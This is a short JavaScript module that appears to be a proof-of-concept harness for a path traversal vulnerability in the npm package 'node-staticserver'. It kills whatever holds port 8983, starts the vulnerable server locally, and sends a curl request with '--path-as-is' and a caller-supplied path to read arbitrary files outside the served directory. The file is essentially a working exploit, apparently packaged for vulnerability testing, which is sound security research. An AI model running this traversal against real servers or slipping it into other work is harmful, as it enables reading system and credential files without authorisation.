function exploitFunction(payload) {
  const pkg = require("node-staticserver");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(payload).toString();

  try {
    exec("fuser -k 8983/tcp", () => {});
  } catch (e) {}

  let app = pkg();
  app.listen(8983);

  return new Promise((resolve, reject) => {
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8983${payload}"`;
    exec(attack_string, (error, stdout) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout);
      }
    });

    // Ensure the server stops after the test
    setTimeout(() => {
      app.close(() => {
        console.log("Server closed");
      });
    }, 1000); // Wait for 1 second before closing the server
  });
}

module.exports = { exploitFunction };